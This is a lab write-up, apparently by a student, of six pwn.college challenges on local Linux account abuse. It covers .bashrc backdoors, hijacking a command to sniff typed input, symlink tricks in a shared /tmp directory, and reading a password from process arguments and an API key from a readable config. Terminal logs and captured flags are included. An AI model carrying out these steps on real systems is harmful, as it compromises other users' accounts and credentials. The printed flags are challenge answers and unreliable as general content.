# 1. Bashrc Backdoor
Manipulating `.bashrc` to intercept the flag  
## My solve  
**Flag:** `pwn.college{Iwenr65Kac5nyrMDQ-4wnPhfqNL.0VMzEzNxwiMxkjNzEzW}`  
In this challenge, I accessed the `.bashrc` file of the user `zardus` in the home directory `/home/zardus` to add a command that would retrieve and display the flag when zardus logged in.  

```bash
hacker@shenanigans~bashrc-backdoor:~$ nano /home/zardus/.bashrc
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim 
Username: zardus
Password: **********
pwn.college{Iwenr65Kac5nyrMDQ-4wnPhfqNL.0VMzEzNxwiMxkjNzEzW}
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
```

## What I learned  
How to modify a user's `.bashrc` file to execute commands automatically upon login.  

## References  
pwn college description  

---

# 2. Sniffing Input
Hijacking the `flag_checker` command  
## My solve  
**Flag:** `pwn.college{ctDikqdHysoYXCmqhWy9UraQO4k.0VNzEzNxwiMxkjNzEzW}`  
I modified the `.bashrc` file to replace the `flag_checker` command with my own script that echoed input, allowing me to capture the flag when `zardus` ran it.  

```bash
hacker@shenanigans~sniffing-input:~$ which echo
/run/dojo/bin/echo
hacker@shenanigans~sniffing-input:~$ which cat
/run/dojo/bin/cat
hacker@shenanigans~sniffing-input:~$ nano flag_checker 
hacker@shenanigans~sniffing-input:~$ chmod +x flag_checker
hacker@shenanigans~sniffing-input:~$ nano /home/zardus/.bashrc 
hacker@shenanigans~sniffing-input:~$ /challenge/victim 
Username: zardus
Password: **********
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag
*************************************************************pwn.college{ctDikqdHysoYXCmqhWy9UraQO4k.0VNzEzNxwiMxkjNzEzW}
exit
exit
```

## What I learned  
How to hijack a command in a user's `.bashrc` to intercept user input.  

## References  
pwn college description  

---

# 3. Overshared Directories
Exploiting world-writable directories  
## My solve  
**Flag:** `pwn.college{8HBe6dgu6XCQD0zsy4WFt3AX3u_.0FM0EzNxwiMxkjNzEzW}`  
I used the world-writable permissions on `/home/zardus` to create or modify files, enabling me to execute unauthorized actions within that directory.  

```bash
acker@shenanigans~overshared-directories:~$ nano .bashrc
hacker@shenanigans~overshared-directories:~$ nano flag_checker 
hacker@shenanigans~overshared-directories:~$ rm /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ cp ./.bashrc /home/zardus/
hacker@shenanigans~overshared-directories:~$ /challenge/victim 
Username: zardus
Password: ***********
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag
*************************************************************pwn.college{8HBe6dgu6XCQD0zsy4WFt3AX3u_.0FM0EzNxwiMxkjNzEzW}
exit
exit
```

## What I learned  
The security implications of having world-writable directories and how to exploit them.  

## References  
pwn college description  

---

# 4. Tricky Linking
Creating symbolic links to exploit shared directories  
## My solve  
**Flag:** `pwn.college{4auLEF6sVFkKDr19oKmdCXg4GVR.0VM0EzNxwiMxkjNzEzW}`  
I replaced a sensitive file with a symbolic link in the shared directory so that unauthorized commands would follow the link to their intended targets, allowing me to execute them.  

```bash
hacker@shenanigans~tricky-linking:~$ rm /tmp/collab/evil-commands.txt 
rm: remove write-protected regular file '/tmp/collab/evil-commands.txt'? y
hacker@shenanigans~tricky-linking:~$ ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ /challenge/victim 
Username: zardus
Password: ***********
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
hacker@shenanigans~tricky-linking:~$ /challenge/victim 
Username: zardus
Password: ***********
pwn.college{4auLEF6sVFkKDr19oKmdCXg4GVR.0VM0EzNxwiMxkjNzEzW}
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
```

## What I learned  
How to create symbolic links to compromise file integrity in world-writable directories.  

## References  
pwn college description  

---

# 5. Sniffing Process Arguments
Stealing sensitive arguments from process invocations  
## My solve  
**Flag:** `pwn.college{wUKZl4v9tSMTwNE1uicNdaZ5dU5.0FOzEzNxwiMxkjNzEzW}`  
I monitored process arguments for the automation script that zardus used, capturing the password he entered during execution, which allowed me to log into his account.  

```bash
hacker@shenanigans~sniffing-process-arguments:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.3  0.0   1056   640 ?        Ss   11:50   0:00 /sbin/docker-init -- /nix/var/nix/profiles/dojo-workspace/bin/dojo-init /run/dojo/bin/sleep 6h
root           7  0.1  0.0 231708  2560 ?        S    11:50   0:00 /run/dojo/bin/sleep 6h
root         147  0.0  0.0   5204  3520 ?        S    11:50   0:00 su -c auto.sh --user zardus --pass pw_2059719160 zardus
zardus       151  0.0  0.0   4132  2560 ?        Ss   11:50   0:00 /bin/bash /run/challenge/bin/auto.sh --user zardus --pass pw_2059719160
zardus       152  0.0  0.0 231708  2560 ?        S    11:50   0:00 sleep 6h
hacker       156  0.3  0.0 231576  3520 pts/0    Ss   11:50   0:00 /nix/store/0nxvi9r5ymdlr2p24rjj9qzyms72zld1-bash-interactive-5.2p37/bin/bash /run/dojo/bin/ssh-entrypoint
hacker       162  0.0  0.0 231940  4160 pts/0    S    11:50   0:00 /run/dojo/bin/bash --login
hacker       171  0.0  0.0 233600  3840 pts/0    R+   11:51   0:00 ps auxww
hacker@shenanigans~sniffing-process-arguments:~$ su zardus
Password: 
zardus@shenanigans~sniffing-process-arguments:/home/hacker$ sudo cat /flag 
pwn.college{wUKZl4v9tSMTwNE1uicNdaZ5dU5.0FOzEzNxwiMxkjNzEzW}
```

## What I learned  
How to intercept sensitive data from commands and processes running on the system.  

## References  
pwn college description  

---

# 6. Snooping on Configurations
Extracting sensitive data from configuration files  
## My solve  
**Flag:** `pwn.college{sbxatTZm5Ud4YT1r39tLxagzqWa.0lM0EzNxwiMxkjNzEzW}`  
I accessed the `.bashrc` file to extract a stored API key, which I then used to retrieve the flag by executing the `flag_getter` command with the key.  

```bash
hacker@shenanigans~snooping-on-configurations:~$ cat /home/zardus/.bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
FLAG_GETTER_API_KEY=sk-1755232237
hacker@shenanigans~snooping-on-configurations:~$ flag_getter --key sk-1755232237
Correct API key! Do you want me to print the flag (y/n)?
y
pwn.college{sbxatTZm5Ud4YT1r39tLxagzqWa.0lM0EzNxwiMxkjNzEzW}
```

## What I learned  
How to exploit world-readable configuration files to extract sensitive information.  

## References  
pwn college description
